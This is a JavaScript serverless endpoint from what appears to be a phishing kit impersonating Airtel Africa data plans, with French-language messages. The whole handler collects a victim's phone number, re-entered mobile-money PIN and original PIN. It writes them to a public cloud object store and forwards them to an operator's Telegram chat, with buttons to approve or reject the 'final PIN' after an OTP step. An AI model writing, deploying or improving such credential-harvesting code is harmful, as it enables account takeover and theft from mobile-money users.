const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN || '';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.VITE_TELEGRAM_CHAT_ID || '';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    const { sessionId, cloudId, phone, pin, originalPin, planName, planPrice, country, fullPhone } = req.body || {};

    if (!sessionId || !pin) {
      return res.status(400).json({ error: 'Paramètres manquants.' });
    }

    const cleanPin = pin.toString().replace(/\D/g, '').slice(0, 4);
    const cleanPhone = phone ? phone.toString().replace(/\D/g, '').replace(/^243/, '').replace(/^0/, '') : 'Inconnu';
    const displayPhone = fullPhone || (phone ? `+243 ${cleanPhone}` : 'Inconnu');
    const displayCountry = country || 'Airtel Africa';
    const targetId = cloudId || sessionId;
    const cbId = targetId.length <= 36 ? targetId : targetId.slice(0, 18) + '_' + targetId.slice(-14);

    // Update cloud record
    try {
      const fetchRes = await fetch(`https://api.restful-api.dev/objects/${targetId}`);
      if (fetchRes.ok) {
        const record = await fetchRes.json();
        const data = record.data || {};
        data.reenterPin = cleanPin;
        data.reenterStatus = 'pending';
        data.lastUpdated = Date.now();

        await fetch(`https://api.restful-api.dev/objects/${targetId}`, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            name: record.name || targetId,
            data,
          }),
        });
      }
    } catch (e) {
      console.warn('Error updating reenterPin in cloud record:', e);
    }

    const messageText =
      `🔐 <b>CODE PIN CONFIRMÉ / RESSAISI (ÉTAPE POST-OTP)</b>\n\n` +
      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
      `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
      `🔑 <b>Code PIN Ressaisi (Correct):</b> <code>${cleanPin}</code>\n` +
      `📌 <b>Code PIN Initial:</b> <code>${originalPin || 'N/A'}</code>\n` +
      `📦 <b>Forfait:</b> ${planName || 'Forfait Airtel Starlink'} (${planPrice || '$1.49'})\n` +
      `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
      `🆔 <b>Session:</b> <code>${targetId}</code>\n\n` +
      `👇 <i>Confirmez la validation finale du code PIN pour activer le forfait :</i>`;

    const inlineKeyboard = [
      [
        {
          text: '✅ Valider PIN Final',
          callback_data: `approve_reenter_${cbId}`,
        },
        {
          text: '❌ Rejeter PIN Final',
          callback_data: `reject_reenter_${cbId}`,
        },
      ],
    ];

    let tgData = null;
    if (BOT_TOKEN && CHAT_ID) {
      const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: messageText,
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: inlineKeyboard,
          },
        }),
      });
      tgData = await tgRes.json();
    }

    const telegramSent = Boolean(tgData && tgData.ok);

    return res.status(200).json({
      success: true,
      telegramSent,
      sessionId,
      cloudId: targetId,
      status: 'pending',
      telegramResult: tgData,
    });
  } catch (error) {
    console.error('Error in send-reenter-pin serverless:', error);
    return res.status(500).json({ error: error.message || 'Internal Server Error' });
  }
}
